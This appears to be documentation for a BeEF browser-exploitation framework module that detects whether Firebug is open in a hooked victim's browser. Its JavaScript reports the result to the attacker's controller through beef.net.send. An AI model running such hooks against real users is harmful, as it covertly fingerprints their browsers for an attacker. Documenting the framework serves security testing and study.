## Summary

* **Objective**: This module checks if the Mozilla Firefox Firebug extension is being use to inspect the current window.
* **Date**: February 2012
* **Author**: bcoles
* **Browser**: Firefox
* [code](https://github.com/beefproject/beef/tree/master/modules/browser/detect_firebug)

## Internal working

This module test if _window.console.firebug_ or _window.console.exception_ objects exists to detect enabled firefbug module:

```javascript
beef.execute(function() {
    var result = "Not in use or not installed";
    if (window.console && (window.console.firebug || window.console.exception)) result = "Enabled and in use!";
        beef.net.send("<%= @command_url %>", <%= @command_id %>, "firebug="+result);
});
```

